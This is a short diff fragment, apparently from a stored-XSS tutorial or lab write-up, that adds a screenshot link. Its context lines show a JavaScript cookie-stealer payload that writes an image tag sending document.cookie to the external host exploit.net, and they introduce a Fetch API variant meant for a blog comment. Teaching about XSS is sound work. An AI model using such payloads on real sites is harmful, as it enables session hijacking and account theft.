@@ -123,6 +123,8 @@ document.write('<img src="http://exploit.net?cookieStealer='+document.cookie+'" 
 </script>
 ```  
 
+![Stored XSS Blog post](stored-xss-blog-post.png)  
+
 >**Fetch API** JavaScript Cookie Stealer payload in Blog post comment.  
 
 ```JavaScript
